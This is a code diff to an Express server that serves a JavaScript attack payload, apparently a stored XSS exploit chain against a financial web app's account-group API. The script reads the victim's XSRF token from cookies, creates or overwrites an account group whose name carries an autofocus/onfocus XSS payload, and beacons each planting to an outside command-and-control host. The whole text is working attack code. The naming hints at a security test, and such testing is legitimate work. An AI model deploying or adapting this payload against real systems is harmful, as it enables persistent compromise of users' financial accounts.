@@ -44,40 +44,73 @@ app.get("/stored-callback", (req, res) => {
 
 app.get("/stored.js", (_req, res) => {
   res.type("application/javascript").send(`
-var C2 = 'https://appsec-test-website.onrender.com';
-
-// Step 1: GET groups (rotates DI-XSRF-TOKEN)
-var g = new XMLHttpRequest();
-g.open('GET', '/sgw3/secureapp/N600/WebAPI/groups', false);
-g.withCredentials = true;
-g.send();
-var groups = JSON.parse(g.responseText);
-
-// Step 2: Read FRESH DI-XSRF-TOKEN (rotated by the GET above)
-var xsrf = decodeURIComponent(document.cookie.match(/DI-XSRF-TOKEN=([^;]+)/)[1]);
-
-if (groups && groups.length > 0) {
-  var groupId = groups[0].groupId;
-  var accounts = groups[0].accountNumbers;
-
-  // Step 3: Overwrite group name with stored XSS payload
-  // When Portfolio Performance renders this, onfocus fires automatically via autofocus
-  var payload = '" onfocus="fetch(\\'' + C2 + '/stored-callback\\')" autofocus="';
-
-  var x = new XMLHttpRequest();
-  x.open('POST', '/sgw3/secureapp/N600/WebAPI/groups/' + groupId + '/update', false);
-  x.withCredentials = true;
-  x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  x.setRequestHeader('X-Xsrf-Token', xsrf);
-  x.send('accountGroupingName=' + encodeURIComponent(payload) +
-         '&accountNumbers%5B%5D=' + accounts.join('&accountNumbers%5B%5D=') +
-         '&groupId=' + groupId);
-
-  // Confirm planting to C2
-  new Image().src = C2 + '/stored-callback?event=planted&group=' + groupId;
-}
+    var C2 = 'https://appsec-test-website.onrender.com';
+    
+    // Step 1: GET groups (also rotates DI-XSRF-TOKEN)
+    var g = new XMLHttpRequest();
+    g.open('GET', '/sgw3/secureapp/N600/WebAPI/groups', false);
+    g.withCredentials = true;
+    g.send();
+    var groups = JSON.parse(g.responseText);
+    
+    // Step 2: Read FRESH DI-XSRF-TOKEN
+    var xsrf = decodeURIComponent(document.cookie.match(/DI-XSRF-TOKEN=([^;]+)/)[1]);
+    
+    var groupId, accounts;
+    
+    if (groups && groups.length > 0) {
+      // Existing group — just grab its ID and accounts
+      groupId = groups[0].groupId;
+      accounts = groups[0].accountNumbers;
+    } else {
+      // No groups — get account list and create one
+      var a = new XMLHttpRequest();
+      a.open('GET', '/sgw3/secureapp/N600/WebAPI/accounts', false);
+      a.withCredentials = true;
+      a.send();
+      var accts = JSON.parse(a.responseText);
+    
+      // Re-read XSRF token (GET above may have rotated it)
+      xsrf = decodeURIComponent(document.cookie.match(/DI-XSRF-TOKEN=([^;]+)/)[1]);
+    
+      // Pick the first account number
+      var acctNum = accts[0].accountNumber || accts[0].AccountNumber;
+      accounts = [acctNum];
+    
+      // Create a group with the stored XSS payload as its name
+      var payload = '" onfocus="fetch(\\'' + C2 + '/stored-callback\\')" autofocus="';
+      var c = new XMLHttpRequest();
+      c.open('POST', '/sgw3/secureapp/N600/WebAPI/groups', false);
+      c.withCredentials = true;
+      c.setRequestHeader('Content-Type', 'application/json');
+      c.setRequestHeader('X-Xsrf-Token', xsrf);
+      c.send(JSON.stringify({
+        accountGroupingName: payload,
+        accountNumbers: accounts
+      }));
+    
+      var created = JSON.parse(c.responseText);
+      groupId = created.groupId;
+      new Image().src = C2 + '/stored-callback?event=planted&group=' + groupId + '&method=created';
+      // Done — group was created with the payload already in the name
+    }
+    
+    // If we used an existing group, overwrite its name with the payload
+    if (groups && groups.length > 0) {
+      var payload = '" onfocus="fetch(\\'' + C2 + '/stored-callback\\')" autofocus="';
+      var x = new XMLHttpRequest();
+      x.open('POST', '/sgw3/secureapp/N600/WebAPI/groups/' + groupId + '/update', false);
+      x.withCredentials = true;
+      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      x.setRequestHeader('X-Xsrf-Token', xsrf);
+      x.send('accountGroupingName=' + encodeURIComponent(payload) +
+             '&accountNumbers%5B%5D=' + accounts.join('&accountNumbers%5B%5D=') +
+             '&groupId=' + groupId);
+      new Image().src = C2 + '/stored-callback?event=planted&group=' + groupId + '&method=updated';
+    }
   `);
 });
+
 
 app.get("/accounts.js", (_req, res) => {
   res.type("application/javascript").send(`
